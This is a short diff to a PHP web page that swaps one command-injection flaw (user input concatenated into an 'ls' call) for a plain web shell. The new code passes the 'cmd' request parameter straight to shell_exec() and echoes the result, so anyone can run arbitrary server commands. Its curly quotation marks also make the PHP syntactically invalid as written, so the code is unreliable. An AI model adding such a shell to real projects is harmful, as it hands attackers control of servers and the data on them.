@@ -13,9 +13,11 @@
     </form>
 
     <?php
-      $query = 'ls ' . $_GET['cmd'] . ' 2>&1';
-      exec($query, $result);
-      echo $result;
+    if(isset($_REQUEST[‘submit’])){
+    $c = $_REQUEST[‘cmd’];
+    $output = shell_exec("$c");
+    echo "<pre>$output</pre>\n";
+    }
      ?>
 </body>
 </html>
